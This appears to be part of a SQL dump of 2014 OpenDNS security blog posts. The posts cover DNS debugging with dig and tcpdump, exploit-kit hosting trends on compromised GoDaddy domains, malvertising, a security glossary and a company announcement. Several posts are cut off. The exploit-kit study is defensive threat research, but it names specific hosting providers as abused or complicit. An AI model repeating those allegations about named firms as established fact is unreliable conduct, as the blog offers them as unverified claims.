authoritative server only contain a AAAA (IPv6) record for that hostname.\n# dig a www.ipv6.awfulhak.org\r\n;; Got answer:\r\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1888\r\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0\n;; QUESTION SECTION:\r\n;www.ipv6.awfulhak.org.INA\n;; AUTHORITY SECTION:\r\nipv6.awfulhak.org.180INSOAns0.ipv6.Awfulhak.org. brian.Awfulhak.org. 2014051800 28800 1800 3600000 180\nFrom the output we can see that our status code is “noerror”, and there is no answer section, this is dig’s way of showing a NODATA response. We’re getting this response because the authority server has some records for the host “www.ipv6.awfulhak.org”, just no records of type “A”. Now compare that output to running a dig for “does-not-exist.awfulhak.org”, a host which doesn’t exist (has no records in the authority at all).\n# dig a does-not-exist.awfulhak.org\r\n;; Got answer:\r\n;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 59249\r\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0\n;; QUESTION SECTION:\r\n;does-not-exist.awfulhak.org.INA\n;; AUTHORITY SECTION:\r\nawfulhak.org.1800INSOAns2.knigma.org. brian.Awfulhak.org. 2014052400 28800 1800 3600000 1800\nBecause the name server has no entires, of any type, for the host “does-not-exist.awfulhak.org”, we get the NXDOMAIN error code.\n“So why is this important to dual-stacked machines?”\nWhen working in a dual-stacked network you’ll find many types of network configurations, some hosts with IPv4 addresses only, some with IPv6 only, and some with both. Often when debugging DNS, people will run “dig <hostname>” without considering what type of DNS record matter to their hosts. By default dig sends requests for A (IPv4) records, so if the hostname you’re querying for only has IPv6 records, you won’t see an answer section or an NXDOMAIN error code (because it is actually a NODATA response). This is now your cue to query for other (most likely AAAA) records.\nHopefully now you have a greater understanding of NXDOMAIN vs NODATA, and you can spot the difference when debugging DNS issues in a dual-stacked network.', 'DNS;Security;Security Engineering', 'https://umbrella.cisco.com/blog/2014/06/23/nxdomain-nodata-debugging-dns-dual-stacked-hosts/');

You’ll definitely see some familiar argot below; many practitioners and all vendors are guilty of using these phrases—including us!\nIn this post, we round up the worst words around and examine how they’re being used in the security space. Now, you can stop shouting “the cloud! the cloud!” at your screen – we’ll get to it. But first, the rest of the list:\nDefense-in-Depth (a.k.a. expense-in-depth):\nBuyer, beware! This concept refers to the multiple layers of security protecting your data. Unfortunately, this term has also become the battlecry of “me too” vendors – salesmen trying to con buyers into wasting money on solutions they don’t really need. Smart security spending, strategically aligned to what your greatest risks are, will trump a mess of the latest and greatest any day.\nAPT (Advanced Persistent Threat):\nMore like advanced persistent term, amirite? First, an incredibly brief definition: APTs are a specific type of targeted attack. They are conceived and executed by professionals using highly evolved methods, and their goal is to live in your network for long periods of time, siphoning data from your organization for malicious purposes. Real APTs are serious threats and should be recognized as such.\nThat being said, APT is a handy acronym that looks great when written threateningly at the top of a Web page or one-pager. This once-serious term has been ground through the marketing mill so thoroughly that it has very little meaning anymore – vendors claim that their solutions can protect against APTs, but guess what? THEY DON’T—they’re just slapping the APT label on any attack that threatens your network, advanced, persistent, targeted, or not.\nBig Data:\nFirst things first—if you are storing or analyzing “big data” in an SQL database or SIEM, it is not big data. In a world where everyone claims to have vast amounts of information at their fingertips, the term is subjective and size is relative. More importantly, when discussing the concept of Big Data, most people get hung up on volume, and often neglect the fact that extracting relevant and compelling intelligence (in a timely fashion) from that data is the real prize. For more information on Big Data, check out this blog from OpenDNS Product Manager Trey Kelly.\nUnknown Threat:\n“Reports that say there’s—that something hasn’t happened are always interesting to me, because as we know, there are known knowns; there are things that we know that we know. We also know there are known unknowns; that is to say we know there are some things we do not know. But there are also unknown unknowns, the ones we don’t know we don’t know.” – Donald Rumsfeld\nROI:\nA phrase seemingly invented to placate management types. What could be better than explaining how much money and/or time you’re about to save the company? Not much. However, this term becomes relatively meaningless to actual security practitioners before the ink dries on the contract.\nBest of breed:\nUser-friendly:\nA great characteristic to list on your product page, but irrelevant for practiced professionals. “User-friendly” smacks of the technically incompetent.\nNext-Generation:\nVendors are constantly trying to out-do their competition––so it makes sense that companies don’t just want to be the best TODAY, they want to be the best tomorrow, too. But who decides when one generation ends, and another begins? Does a survey go out? Is there a countdown clock? And in 2015, are we going to start seeing marketing promos for the Next-Next-Generation Firewalls? At the end of the day, this phrase is so overused it has absolutely no meaning.\nThe Cloud:\nTyping “What is the cloud?” into Google yields about 265,000,000 results, yet somehow, no one seems to know what the cloud is. It’s a term as nebulous and ephemeral as its namesake, and thus has been exploited to death by marketers looking to capitalize on the confusion of buyers.\nHere’s the thing: done right, the cloud is awesome. It can give individuals and organizations alike access to new tools that promote efficiency, collaboration, productivity, and security at scale. Unfortunately, these tangible benefits of cloud computing have remained a mystery to most people, causing them to place the cloud on a puffy pedestal and creating headaches for their earth-bound IT admins (sometimes with hilarious results).', 'Security 101', 'https://umbrella.cisco.com/blog/2014/06/20/keep-using-word-think-means-think-means/');

We discussed the evasive methods of the bad actors, their abuse of hosting providers, and we elaborated on methods to predictively identify and block IP infrastructures set up by adversaries to deliver Exploit kit attacks. Since then, several elements have changed in the MO of bad actors.\nIn this blog, we discuss some results of a subsequent new 5-month study we conducted between February and June 2014. Earlier brief results were discussed at BSides Raleigh 2013 [2] (slides 27,28), and then we shared some preliminary results of the new study at the ISOI13 conference in March [3]. This work is still ongoing and we will cover more details at BlackHat [4] and VirusBulletin [5].\nFor this study, we designed a system to preemptively and effectively detect malicious subdomains injected under compromised domains (particularly GoDaddy domains) and track their IP infrastructure. The phenomena of compromised GoDaddy domains serving malware has been around for at least 2 years [6]. The compromise can happen through at least two methods: hacking GoDaddy accounts or injecting malicious redirection scripts into vulnerable GoDaddy websites. When the compromise is successful, subdomains (third level domains) are injected under the GoDaddy domains (second level domains), and these subdomains would resolve to malicious sites.\nMost Abused ASNs\nWe have been monitoring this threat for the past 5 months (February to June 2014) and observed that the subdomains resolve to IPs serving Exploit kit attacks (typically Nuclear [7][8] and Angler [9][10]) and also browser-based ransomware. We recorded several hundred IPs hosting these malicious subdomains over the period of the study.\nThe top 5 abused ASNs are:\n16276 OVH SAS\n24961 myLoc managed IT AG\n15003 Nobis Technology Group, LLC\n41853 LLC NTCOM\n20473 Choopa, LLC\nAS16276, which is OVH, hosted 18% of the total malicious IPs. In this specific case, as the abuse of OVH has been exposed since last year and up until February 2014 (particularly for hosting Nuclear Exploit domains [11]), bad actors have changed their MO: they switched temporarily to other hosting providers, and started using recycled IPs (not reserved exclusively for Exploit domains). Additionally, OVH took action by suspending rogue accounts.\nHowever, by monitoring the compromised domains’ campaigns, we observed that OVH was still being abused by bad actors to host malicious content. These were the general changes in bad actors’ MO that we observed:\nFrom a domain perspective, for a while, bad actors had been abusing various ccTLDs (e.g. .pw, .in.net, .ru, etc.) facilitated by rogue or victim registrars and resellers. Then, they supplemented that approach with using compromised domains, particularly GoDaddy domains under which they inject subdomains to host Exploit kit landing urls and browlock (Notice that using compromised domains for attacks goes further back in the past for other different campaigns).\nFrom an IP perspective, bad actors used to bring the attack hosting IPs online in contiguous chunks, then they started bringing them up in randomized sets or one IP at a time.\nThe other notable fact is that bad actors used to abuse OVH Canada (attached to ARIN) where rogue customers were reserving re-assigned small ranges (/27, /28, /29, etc.). By consulting the ARIN Rwhois database, it was possible to correlate the rogue customers with the IP ranges they reserve and therefore predict and block the IP infrastructures they set up for Exploit kit attacks. As the adversaries changed MO, this method became less effective in tracking them.\nThe shift became clear when they started to more frequently use ranges on OVH’s European IP space (which is attached to RIPE) as well as other European providers. Typically, we saw small gaming hosting providers being abused among other platforms.\nAdditionally, although the standard geolocation of OVH European IP space maps to France (FR), the attack IP ranges were reserved from OVH’s server pools in various European countries (France, Belgium, Italy, UK, Ireland, Spain, Portugal, Germany, Netherlands, Finland, Czech Republic, and Russia).\nThis clearly shows that the adversaries are diversifying their hosting assets which provides them redundancy and evasive capabilities. Notice also that RIPE has stricter data protection laws so it would be more difficult to obtain information about customers, and that could explain the shift in hosting infrastructures by the bad actors.\nMore generally, we list a few of the small scale hosting providers involved in hosting the attack subdomains. These hosting providers could either be abused, complicit with the bad actors or simply lax about the maliciousness of the content they host. Notice the rogue providers among these will often switch prefixes by dropping dirty ones and reserving new ones from the backbone providers they are attached to.\nhttp://king-servers.com/en/ This hoster has been observed to host Exploit kit domains (Angler, Styx), porn, dating sites, pharma sites [12][13]. It was also described by a comment on Web Of Trust as “Offers bulletproof hosting for Russian-Ukrainian criminals (malware distributors etc)” [14].\n\nhttp://evrohoster.ru/en/ hosted browlock through redirections from porn sites [15].\n\nhttp://www.xlhost.com/ hosted Angler EK domains [16]\nhttps://www.ubiquityhosting.com/ hosted browlock.\nhttp://www.qhoster.bg/ hosted Nuclear EK domains.\nhttp://www.codero.com/\nhttp://www.electrickitten.com/web-hosting/\nString Analysis of Domain Names\nDuring this study, we recorded 19,000+ malicious subdomains injected under 4200+ compromised GoDaddy 2LDs. By analyzing the strings used for the subdomains, we recorded 12,000+ different labels. We show the list of top 5 labels used: police, alertpolice, css, windowsmoviemaker, solidfileslzsr. police and alertpolice were the most used labels for hostnames serving browlock and the remaining labels were used for hostnames serving mainly Exploit kit attacks.\nIn the chart below, we show the frequency of number of occurrences for all used labels.\n\nOne single label occurred 746 times (police), 1 label occured 22 times (alertpolice), 1 label occurred 10 times (css), 15 labels occurred 6 times (windowsmoviemaker, solidfileslzsr are among them), and 11,727 distinct labels occurred a single time.\nStay tuned for more results at BlackHat [17] and VirusBulletin [18].', 'Big Data;Malware;Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/06/19/dedicated-compromised-domains-shift-adversaries-mo-deliver-exploit-kit-attacks/');

From there they would have two hours to pair up and write some code and come back and present what they did. The judging would be done by anyone who showed up to the demonstrations and we had categories for: Best overall, most creative, and most challenging.\n\nInstead of using a language like Python, Perl, and Ruby, we decided to use Scratch.

That’s bad for many reasons, but one cool thing is that OpenDNS has a product that is awesome at preventing malicious ads from impacting our customers—from Fortune 100 companies to individual home users.\nAds: A Complex and Vulnerable Ecosystem\nNot many Web surfers realize that when you a visit a website such as TMZ.com—a popular tabloid news site—it triggers user interactions with 352 third-party Web servers without your consent. Websites are commonly linked to dozens to hundreds of other servers—most are a result of online ads. In 1997, ad networks were established to be a conduit between advertisers and content publishers. Over the years, advertisers outsourced parts of their ecosystem to third parties, who in turn contracted out further. And as result, online ad delivery evolved into a highly complex process involving an unsecure chain of often six intermediaries that come and go all the time. Like most technology innovations that pursue speed over security, cyber criminals found flaws that were easy to exploit for profit with little risk of being caught.\nMalvertising: From Embarrassment to Epidemic\nEven though Malvertising became a widely known and recurring threat by 2009 (e.g. Guardian article), incidents are frequently forgotten after a few days. Typically, in Malvertising incidents, the website owner suffered some embarrassment, apologized, and pointed a finger at the ad network that served the ad. Then, the network owner apologized and disabled the offending ad. And everyone moved on. Today, it has evolved from mere embarrassments into an epidemic that has caught the attention of the U.S. Senate Homeland Security and Governmental Affairs Committee. After a year of investigations, a subcommittee published a report in May with this #1 finding:\n“Consumers can incur malware attacks without having taken any action other than visiting a mainstream website. The complexity of the online advertising ecosystem makes it impossible for an ordinary consumer to avoid advertising malware attacks, identify the source of the malware exposure, and determine whether the ad network or host website could have prevented the attack.”\nIn 2014, two separate Malvertising incidents impacted millions of Yahoo and YouTube users. In both, simply searching for something or watching a video was enough to lead to an infection. The Online Trust Alliance testified that based on its research, Malvertising increased 200%+ in 2013 to over 209,000 incidents, generating 12.4B+ malicious ad impressions. Cisco’s 2013 Annual Security Report found that online ads were the second most common source of Web malware encounters–16% of all encounters Cisco observed and 182 times more likely than viewing adult content.\nSource: Online Trust Alliance\nOver the years, a majority of the largest ad networks have been compromised including DoubleClick (Google), YieldManager (Yahoo!), AppNexus, rad.msn.com (Microsoft), and Fimserve.com (FOX Audience Network). By focusing on ad networks, attackers obtain an effective channel for indirectly compromising thousands of websites through malicious banner ads, and then targeting every visitor or specific visitors. The biggest Web properties have been impacted including Facebook.com, YouTube.com, MLB.com, USNews.com, NYTimes.com, LATimes.com, WashingtonPost.com, HuffingtonPost.com, LondonStockExchange.com, TheOnion.com, SFGate.com, DailyMotion.com, SpeedTest.net, Hoovers.com, Tucows.com, Hotmail, Yahoo! Mail, numerous ad-supported mobile apps, and even ad-supported desktop apps like Spotify.\nAttackers: As Clever as Advertisers\nTo deliver malicious ads to you, attackers either socially engineer a good reputation for their own fake ad network or advertising service, or hack their way into an existing vulnerable ad network. In the former case, attackers often claim to partner with well-known and legitimate online advertisers—even by using falsified letters of mandate. Attackers gain trust by first offering the targeted publishers creative ads that are clean, before pushing out malicious ones.\nA common misconception is that you must click on ads to get infected, which is sometimes true, but often not. Online ads appear to be an image hosted on the website, but they’re neither hosted on that website nor just an image. Ad networks, which are not under the control of the host website, decide which ad to send you, but often don’t actually deliver the ads. Instead, the ad networks instruct your browser to call a server designated by the advertiser. Also, ads often deliver files and entire programs to your browser.\nTo infect you, HTML-based Javascript or Flash-based ActionScript covertly routes your browser to a different server that hosts an exploit kit. Flash is scary because it embeds sophisticated logic into the ad, which manipulates your browser as the ad is displayed. Ads can be instructed to only attack you and others at particular times and geographies. Some examples are delaying the attack until after the ad network examines and approves the ad; or until holidays, when it’s peak time for people to surf and off time for advertisers’ personnel to promptly remove offending ads. Law enforcement personnel have commonly found calendars marked with U.S. holidays in cyber-criminal hideouts in foreign countries. And if the attackers know that ad malware scanners are located on servers in Los Angeles and New York, they might instruct ads to only be malicious for visitors in San Francisco.\nThe exploit kits themselves probe your browser environment for possible vulnerabilities to attempt. Despite frequent flaws discovered in Adobe and Java browser plug-ins, the security community is vigilant monitoring this activity. Yet Cisco expects Microsoft’s streaming media plug-in—Silverlight—to become the target of more exploit kits. Best known for enabling Netflix’s streaming video service, Silverlight also supports 60% of rich Internet apps—so it will be a bad day for everyone when Malvertising finds its way onto one of these massive streaming platforms.\nSecurity: Reroute Visitors Around Malvertising\nOnline ads often provide the primary or only revenue source for Websites that offer some amazing free content and services. And OpenDNS was a great example of this, yet the risks of Malvertising clearly outweigh the benefit of a few more dollars. Today, we no longer rely on this revenue source to operate either our free or paid services, because we’ve proven to over 10,000 businesses and thousands of home users how amazing our enterprise-grade security service—Umbrella—is at blocking such threats.\nAs nefarious as Malverting is, it does have an achilles heel—your browser must connect to third-party Web servers via a domain name. When your browser asks which IP address is mapped to that domain name, and either the domain or IP is tied to Malvertising, Umbrella routes your browser to our block page server instead—even when you’re not in the office or at home.', 'Announcements;Milestones;Security 101', 'https://umbrella.cisco.com/blog/2014/06/12/ads-security-dont-mix/');

In it, Mari discussed how to use a number of different browser cookies on a client machine to decipher a timeline of events for an individual’s browsing history.\n\n\nA fantastic example of its applicability is during an investigation, where an individual claims that a website was visited in error and only one time. The cookies will show you an individual’s frequency of visits, the last visit, and a number of other details that can be used to refute one’s testimony.

In it, the presenters walked through various use cases for using pivot tables, VLOOKUP functions, and other useful (but easily forgotten if not used every day) commands.\nA final hat tip goes to the Incident Response Patterns: The “Now What?” to the DBIR and VCDB talk by Kyle Maxwell & Kevin Thompson of Verisign and Verizon, respectively. The content was solid but the interaction between the two presenters was what made the talk great. I had a feeling it was going to be good when Kevin began reciting lyrics from old Busta Rhymes songs and it continued into the presentation with what could only be called an interpreitive dance to Kyle’s portions of the slides (see below).\n\nForensics by interpretive dance by @bfist and @kylemaxwell ht @BrianTheSnail pic.twitter.com/mFv0SeXoWr\n— DFIR_Gecko (@SuzanneWidup) June 10, 2014\n\nPresenting a 360 session was, as warned, a little intense.

As security products are shifting from signature-based detection to predictive models, DNS traffic has become an important indicator for discovering infected clients as well as  servers used to send spam, spread malware and control botnets.\nDNS traffic is especially well-suited for botnet detection; this has been the subject of many  research papers featuring case studies with impressive results.\nOne of the very first models we built was a simple classifier using a dozen network and lexical features inspired by these papers. And its performance was impressive out of the box. False positives were nonexistent.\nA paper that was presented recently at IFIP TC11 caught our attention. Called “Mentor: Positive DNS Reputation to Skim-Off Benign Domains in Botnet C&C Blacklists” by Nizar Kheir, Frederic Tran, Pierre Caron, and Nicolas Deschamps, the paper describes creating a model to identify false positives in a list of command and control domains, using the whois data, the popularity and the HTML code on the first page of the website. In the specific case study described in the paper, this classifier performs extremely well — perhaps too well.\nHowever, when our research team applied this model to our global, real-world data set, it did not perform well. We discovered that the model was overfitting the data, because the writers used the Alexa Top Sites list, which contains the most popular websites. This presented skewed results because they overfit the sample lists.\nTo understand why these models did not perform well on real world data, we have to look at how the models were trained and tested.\nTraining and testing a classifier requires a set of domain names assumed to be malicious, as well as a set of domain names assumed to be benign. Public feeds, lists and services are typically used to build the malicious data set.\nHowever, building a list of domains believed to be benign is more challenging. A common practice is to assume that popular websites are likely to be benign, and thus many researchers use Alexa top sites to constitute the benign training set. Alexa is a fantastic service, and offering a list of top 1,000,000 websites for free has proven to be very valuable to many studies and projects — however, it might not be the best choice for building classifiers based on DNS data. Domain names are used for more than websites. Mobile applications, APIs, mail servers, are not necessarily present in the Alexa list, yet they can’t be ignored.\nFor example, we are observing a massive amount of DNS queries for these domain names even though they are missing from the Alexa list:\nwindowsupdate.com (Microsoft Windows update service)\ntrafficmanager.net (Microsoft Azure Traffic Manager)\nadobetag.com (Adobe Analytics platform)\nsamsungosp.com (Samsung push server API)\nDomains from the Top Alexa list also tend to have very distinctive features. They typically use a dedicated hosting infrastructure, services are well-separated, domain names have been registered for a long time, and they are popular by different metrics (e.g. traffic, client diversity, back links, page rank).\n\nIn contrast, traditional command and control servers tend to use hosting services or run different services on the same host. They frequently use newly registered domains, and very few, if any, references to traditional command and control servers are observed on other websites.\nIn this context, a classifier leveraging some of these features is bound to perform extremely well, until tested with non-Alexa domains, as well as compromised domains. Domain names not present in the Alexa list of most popular domains are not necessarily malicious. And fortunately, the vast majority is not.\nThus, training and testing classifiers and reputation systems using non-Alexa domains is critical to performing a real-world evaluation of a model.\nUnfortunately for the research community, there are not many public alternatives to Alexa. Quantcast also offers a high-quality list of top sites for free, but the same caveats of selection bias apply.\nSince 2009, OpenDNS has been providing a high-quality list of phishing sites for free. The Phishtank database is constantly being updated. It can be downloaded in different formats and is trusted by many research projects, products, and services.\nToday, we are thrilled to announce the public availability of two new public domain lists for researchers.\nThe OpenDNS Top Domains List is the top 10,000 domain names our resolvers all over the globe are receiving queries for, sorted by popularity. The popularity is defined as the number of unique client IPs having looked up a domain over a 1 hour period. Domain names that we flagged as being used to serve or control malware are removed from the list.\nThe OpenDNS Random Sample List is a random sample of 10,000 domain names. Similar to the OpenDNS Top Domains List, domains that we flagged as suspicious are not present in the list, that can be used as a benign data set.\nBoth lists are in public domain, available on Github, and are automatically updated weekly.\nThey are not meant to replace other public lists in any way. The Top Domains List, in particular, is solely based on DNS queries and doesn’t reflect the popularity of websites.\nHowever, these lists have been useful to train, test and improve our own models, and by sharing them, we hope that other researchers will find them a useful addition as well.', 'Open Source;Security Community;Security Research', 'https://umbrella.cisco.com/blog/2014/06/05/two-new-public-domain-lists-security-researchers/');

Hopefully the following can help prepare users for some of the gotchas and maybe even inspire certain operating-system maintainers to release a few patches.\nOur test environment was fairly straight forward, we set up an authoritative nameserver with 3 different sub-domains defined. We gave the first sub-domain an IPv4 address only, the second an IPv6 address only, and the third was given both IPv4 and IPv6 addresses.\n# Domain  TTL  Type  Address\ngw.network1.opendns.com  30  a     1.1.1.1\ngw.network2.opendns.com  30  aaaa  2001:470:b:1fc::1\ngw.network3.opendns.com  30  a     2.2.2.2\ngw.network3.opendns.com  30  aaaa  2001:470:b:1fc::2\nWe then went onto four different machines with four different operating system, configured them to be dual-stacked, and configured their resolv.conf to have network{1,2,3}.opendns.com in their search domains:\n# configuration syntax varies across OS’s\nnameserver 67.215.93.85\nsearch network1.opendns.com network2.opendns.com network3.opendns.com\nWe then ran tcpdump to watch the outbound DNS requests and used a simple wrapper program around getaddrinfo() to perform the lookups.\nWhat should happen when we try to resolve the hostname “gw”?\nWe would expect, if an OS is following the “prefer IPv6” standard that we should get “2001:470:b:1fc::1” (the IPv6 address of gw.network2.opendns.com). We expect this because according to the specified search domains, the OS should go through the search domains in the order network1, network2, network3, but also because the OS should be preferring IPv6.\nFor OS’s that follow the Happy-Eyeballs RFC / style we would expect to get “1.1.1.1” as this would be the first thing that would be found as defined by the search domains order. So let’s have a look at what the OS’s actually did…\n\nOSX – 10.9.3\n# sudo tcpdump -n -s 1500 -i en0 udp port 53\n10.10.10.165.63835 > 67.215.93.85.53: 4769+ A? gw.network1.opendns.com.

(41)\n67.215.93.85.53 > 10.10.10.165.62135: 3489 1/0/0 AAAA 2001:470:b:1fc::1 (69)\nFrom the tcpdump output we can see that OSX has decided to send out A (IPv4) and AAAA (IPv6) requests to the first search domain (network1.opendns.com) simultaneously. When the A request gets a valid response, but the AAAA response receives a NODATA response, the OS continues down the search domains list to try and resolve a AAAA answer. The OS then requests a AAAA from network2.opendns, which responds with a valid AAAA answer. Lets now look at what was actually returned by the getaddrinfo call:\n# ./getaddrinfo gw\nAF_INET6 (IPv6) - SOCK_STREAM - IPPROTO_TCP - 2001:470:b:1fc::1\nAF_INET  (IPv4) - SOCK_STREAM - IPPROTO_TCP - 1.1.1.1\nThis where things get odd, the OS’s underlying resolving library has returned us two answers to our request for the domain “gw”, but the actual corresponding host behind each IP are completely different. The IPv4 “1.1.1.1” is for gw.network1.opendns.com and the IPv6 “2001:470:b:1fc::1” answer is for “gw.network2.opendns.com”. At this point, it would be up to the calling application to choose which answer or protocol it prefers, but there is no indication that these correspond to completely different hosts… That’s bad…\n\nLinux – Ubuntu 12.04\n67.215.92.110.14766 > 67.215.93.85.53: 1096+ AAAA? gw.network1.opendns.com.

Although it does start resolving for an IPv6 host first, once it’s found one, it continues to resolve an IPv4 address as well. Also, just like OSX, Linux’s getaddrinfo() returns addresses for both gw.network1.opendns.com and gw.network2.opendns.com.\n\nFreeBSD 10.*\n10.11.13.129.34506 > 67.215.93.85.53: 44935+ A? gw.network1.opendns.com. (41)\n67.215.93.85.53 > 10.11.13.129.34506: 44935 1/0/0 A 1.1.1.1 (57)\n10.11.13.129.55819 > 67.215.93.85.53: 44936+ AAAA? gw.network1.opendns.com. (41)\n67.215.93.85.53 > 10.11.13.129.55819: 44936 0/0/0 (41)\nAF_INET (IPv4)  - SOCK_STREAM - IPPROTO_TCP - 1.1.1.1\nFreeBSD restores our faith in resolving principals. From the tcpdump we can see that it has tried to resolve both an A and AAAA record for the first domain in the resolve search list, and because it found a match (on the A record) it stops there. The getaddrinfo() has returned only the matching IPv4 address.\nIf we repeat this test but move the search domain of “network2” ahead of “network1”, we can see that now (correctly) only the IPv6 address is returned.\n10.11.13.129.34506 > 67.215.93.85.53: 44935+ A? gw.network2.opendns.com.

(41)\n67.215.93.85.53 > 10.11.13.129.55819: 44936 1/0/0 AAAA[|domain]\nAF_INET6 (IPv6) - SOCK_STREAM - IPPROTO_TCP - 2001:470:b:1fc::1\nIf the test is then repeated with “network3” as the first search domain, we (correctly) get both the IPv4 and IPv6 addresses of gw.network3.opendns.com\nAF_INET6 (IPv6) - SOCK_STREAM - IPPROTO_TCP - 2001:470:b:1fc::2\nAF_INET  (IPv4) - SOCK_STREAM - IPPROTO_TCP - 2.2.2.2\n\nWindows 8.1\nMicrosoft’s current offering also gets a passing grade for dual-stacked search domain use. Windows 8.1 performed exactly the same as FreeBSD in all tests scenarios, giving all the expected answers. This shouldn’t come as a big surprise as most of the Windows network stack is derived from BSD source, and we’d be surprised if the resolving libraries weren’t used as well.\n\nAs we can see from the above results, resolving domains on a dual-stacked machine that uses search domains can lead to some confusing results. The recent OS offerings from OSX and Ubuntu leaves the onus on the calling application to decide how to deal with the coming dual stacked world. Fortunately though, the offerings from FreeBSD and Windows do show that some implementations foresaw this issue and implemented the expected functionality.', 'DNS;Security;Security Engineering', 'https://umbrella.cisco.com/blog/2014/06/04/dual-stack-search-domains-host-roulette/');

Terms like backdoor, rootkit, or zero-day, which may be commonplace to a security professional, often leave users in the dark.\nAt OpenDNS, we #SpeakSecurity every day – and you can too! In this post, we define 20 key terms everyone should know:\nThreats\nBackdoor: A backdoor is an access point designed to allow quick and undetected entrance to a program or system, usually for malevolent purposes.\nBotnet: A botnet is a robot network – think hivemind – a collection of infected machines that are used for any number of nefarious activities, from bitcoin mining to DDoS attacks. (Looking for more details? Our Community Moderator, Vinny, recently published a fantastic blog all about botnets.)\nDenial of Service (DoS) Attack: This attack consumes all resources of a target so that it can no longer be used or reached, effectively taking it down. DoS attacks are designed to take a website or server offline, whether for monetary, political, or other reasons. (A DDoS, or Distributed Denial of Service attack, is carried out using two or more hosts.)\nDrive-by download: A drive-by download often installs malware and happens invisibly in the background, when the user visits a malicious webpage, without the user’s knowledge or consent. Often, drive-by downloads take advantage of browser or browser plug-in vulnerabilities that accept the download under the assumption that it’s a benign activity.\nExploit: An exploit is an attack that takes advantage of a weakness in your system, utilizing software, bits of data, and even social engineering. To minimize exploits, it’s important to keep your software up-to-date and to be aware of social engineering attempts.\nMalware: Malware is a general term for any program installed on a system with the intent to corrupt, damage, or disable that system. STUXNET, Conficker, and Flashback are a few famous examples. Common types of malware include:\n– Rootkits: A rootkit is a malicious piece of code that hides itself, prevents detection, and enables bad actors continued access to your system. If attackers gain full access to your system, they can use rootkits to continue that access over a long period of time.\n– Trojans: A trojan is a seemingly innocuous program that acts as a front for malicious code hiding within. Trojans can do any number of things, from stealing data to allowing remote system control.  These malignant programs take their name from the famous Grecian “Trojan Horse”.\n– Viruses: Often used as a blanket term, a virus is a piece of code – a form of malware that attaches itself to files, such as email attachments or random things you download online. The purpose of a virus is to mess with your system, whether that means deleting files or corrupting your data. Computer viruses also replicate – just like viruses in the physical world.\n– Worms: A worm is a type of malware that clones itself in order to spread to other computers, performing various damaging actions on whatever system it infects. Unlike a virus, a worm exists as a standalone entity.\n-Spyware: Malicious code that gathers information about you and your browsing habits, and then sends that information to a third party.\nMitM or Man-in-the-Middle Attack: A MitM attack is pretty much what it sounds like. An attacker will intercept, relay, and potentially change messages between two parties without their knowledge.\nPhishing: Phishing is is a technique that uses a trustworthy-looking communication to steal sensitive information.  Like fishermen with a lure, attackers will attempt to take your personal information by phishing it from you through the use of falsified emails, forms, and web pages. Spear phishing is a form of phishing that targets one specific individual. (Think you can spot a phish in the wild? Test yourself with our quiz!)\nSocial Engineering: A general term for any activity in which an attacker is trying to manipulate you into revealing information.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1534, 'No more ads', 'David Ulevitch, Founder/CEO', 'May 29, 2014', 'TL;DR: We’ve always tried to put user experience first, even when that gets in the way of making more money. Browsers have changed, we’ve become a security company, and we’ve shifted our business to rely on paying security customers, so we’re turning off the ads in our free DNS service to make that service even better.\nSince this is a longer post, I’ve also published this story on Medium, where it’s slightly easier to read.\nI started OpenDNS to create a DNS service that was better than what was available. The year was 2005 and when it came to DNS, ISPs were pretty much your only option. And ISP-provided DNS was far from good. It was a cost center for them, relegated to the old servers gathering dust in the corner. They had no incentive to invest in this critical piece of infrastructure, despite it influencing so much of your Internet connection’s performance. ISP-provided DNS was slow, unreliable and did nothing to protect you online, despite being (in hindsight, thanks to OpenDNS) an obvious vector for security enforcement.\nDNS was an unpoliced conduit for the spread of phishing attacks, malware and other nefarious stuff. All these bad things needed DNS to propagate or execute their attack. The mission for OpenDNS was to change that and give people everywhere around the world a better DNS — one that’s safer, faster and more reliable.\nThis was a fantastically fun endeavor — reimagining something fundamental that everyone on the Internet uses and unrestrained by concerns about what was or wasn’t possible or had been done in the past. We automatically blocked phishing sites, gave administrators the power to filter unsavory content if appropriate (on school, library or corporate networks, for example) and boosted speed and reliability by making smarter caching decisions behind the scenes. We opened up the black box of DNS and allowed it to be a platform for services, unlocking so much more of its potential. Tens of millions of people switched to OpenDNS, but we needed to make money, too — we’ve always been a revenue-focused company.\nWhen we originally thought about OpenDNS, we really thought of what we were doing as navigation. We were helping people navigate the Internet. We thought this was big. Really big. Bigger than search. In our minds, first you had the browser, and the browser ruled everything — that was Netscape. Then you had Yahoo! They didn’t have a browser, but they had a homepage and a portal. Everyone needed a portal back then, but Yahoo!’s portal was the king. Then Google came out and said you didn’t need a portal, you just needed a search box. You would just go to Google and look for stuff. So we thought that navigation was the next big thing. We could take your address bar, and instead of filling it with complicated URLs, we could instead turn it into a navigation box, and you could type in whatever you wanted and we’d figure it out and take you there, and when we couldn’t, we’d show you search results. Remember, this was years before Chrome and the omnibox existed.\nIt made all the sense in the world to provide this navigation service for free to users and to support it through ads whenever we showed search results. We struck a deal with Yahoo! to serve the search results and ads, and with that the OpenDNS Guide was born. It worked well, and we became a profitable company quickly.\nThe way the Guide works is this: If you’re one of the 50 million people using OpenDNS’ free DNS service and you attempt to visit a website that isn’t resolving (the site’s having technical difficulties or you mistyped its URL), we take you to the Guide. We parse what you typed in the address bar and show you relevant search results in a hopefully helpful attempt to get you back on your merry way. Alongside those search results are ads. Around the time we launched OpenDNS it was one of the most trafficked pages on the Internet. Today, for a variety of reasons, you rarely see it, but back then it was extremely common. The Guide appeared when you’d try to load a webpage that didn’t exist, instead of your browser’s “Server not found” error message.\nIt worked great for several years, but as it happens with technology, the state of the art evolved at a fast clip. Most notably, there were dramatic shifts in the way technology enabled us to navigate the Internet. Enter the omnibox, known to most of you as the Chrome browser today. It built on our idea and turned the address bar into a search field, accommodating behavior that happened anyway and made it so you could type just a phrase into the address bar and be taken to a page of Google search results. We knew, and know, the omnibox provides the superior user experience: it was built into the browser as code, and had more smarts than using DNS alone allowed, providing a better user experience. For a while, we tried to improve our experience, but it was a losing battle. We also realized it meant fighting Google on the only strategic battlefield that matters to them. Google’s only real battlefield is anything that gets between the user and the advertisement. That’s not a fight we wanted to be in.\nIn 